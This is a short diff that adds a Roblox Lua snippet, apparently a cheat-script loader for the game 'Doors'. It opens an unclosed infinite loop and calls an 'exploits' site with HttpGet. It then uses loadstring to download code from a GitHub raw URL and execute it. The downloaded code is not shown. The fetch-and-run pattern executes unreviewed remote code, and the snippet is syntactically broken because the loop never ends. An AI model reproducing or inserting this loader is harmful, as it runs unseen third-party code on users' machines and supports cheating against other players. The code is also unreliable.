@@ -1,0 +1,5 @@
+while true do
+game:HttpGet("https://getexploits.com/cexecution/675832348906115072")
+
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/5iREx/script/main/doors'))()
